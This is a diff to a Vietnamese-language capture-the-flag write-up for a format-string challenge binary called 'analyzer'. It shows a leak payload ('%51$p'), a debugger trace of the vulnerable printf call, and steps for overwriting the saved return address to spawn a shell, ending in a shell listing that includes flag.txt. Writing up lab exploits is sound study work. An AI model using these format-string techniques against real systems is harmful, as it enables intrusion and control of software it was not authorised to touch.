@@ -180,26 +180,40 @@ byte = read_byte(buff, size);
 ```python
 b'a'*10 +  b'0b' +b'08' + b'aabaaaaaabaaaaaa' + b'0b' + b'08' +  b'2535312470000000'
 ```
-- format string sẽ được dịch lại tương tự như cách dịch của hàm hexs2bin
+- format string sẽ được dịch lại tương tự như cách dịch của hàm hexs2bin: 2535312470000000
+- sau khi nhập vào thì sẽ leak được địa chỉ và quay lại 1 vòng lặp mới
+```assembly
+  0x401928 <main+607>    mov    eax, 0
+   0x40192d <main+612>    call   printf@plt                      <printf@plt>
+ 
+   0x401932 <main+617>    lea    rax, [rbp - 0x120]
+   0x401939 <main+624>    mov    rdi, rax
+   0x40193c <main+627>    mov    eax, 0
+ ► 0x401941 <main+632>    call   printf@plt                      <printf@plt>
+        format: 0x7fffffffe4e0 ◂— 0x7024313525 /* '%51$p' */
+        vararg: 0x7fffffffc380 ◂— 0x6e20726579616c50 ('Player n')
+ 
+   0x401946 <main+637>    mov    edi, 0xa
+   0x40194b <main+642>    call   putchar@plt                      <putchar@plt>
+ 
+   0x401950 <main+647>    lea    rdx, [rbp - 0x120]
+   0x401957 <main+654>    lea    rsi, [rbp - 0x130]
+   0x40195e <main+661>    lea    rax, [rbp - 0x128]
+```
+- sau khi leak được địa chỉ thì đến bước ghi payload, em sẽ có 3 địa chỉ để ghi vào saved-rip, mỗi địa chỉ ghi 3 lần vì thế em cần viết hàm để ghi qua formatstring
+- vì hàm main lặp lại nên có thể ghi nhiều lần tùy ý
+- sau khi ghi xong và thoát khỏi vòng lặp thì em có thể chạy shell
+
+[*] 0x2563343139383525
+[*] 0x202020206e682436
+[*] this is part 2 of addr 0x7fffffffe620: 0xf7c5
+[*] this is package part 2: 0xe622
+[*] Switching to interactive mode
 ```c
-read_string(&pointerofbuff, &size, format, '\xFF');
-    printf("Hash: %s\n", format);
-    read_string(&pointerofbuff, &size, format, 0xFFu);
-    printf("Player name: ");
-    printf(format);
-    putchar(10);
-    read_string(&pointerofbuff, &size, format, 0xFFu);
-    consume_bytes(&pointerofbuff, &size, 10);
-    v6 = read_short(&pointerofbuff, &size);
-    printf("Miss count: %d\n", v6);
-    if ( v6 )
-      puts("Yep, looks like you missed.");
-    else
-      puts("You didn't miss!");
-    puts("=~=~=~=~=~=~=~=~=~=~=\n");
-    free(buff);
-    free(pointerofbuff);
-  }
-  return 0;
-}
+Error: failed to decode hex
+$ ls
+Dockerfile    analyzer_patched        analyzer_patched.id2  ld-2.35.so
+analyzer      analyzer_patched.i64  analyzer_patched.nam  libc.so.6
+analyzer.i64  analyzer_patched.id0  analyzer_patched.til  miss.md
+analyzer.py   analyzer_patched.id1  flag.txt          start-docker.sh
 ```
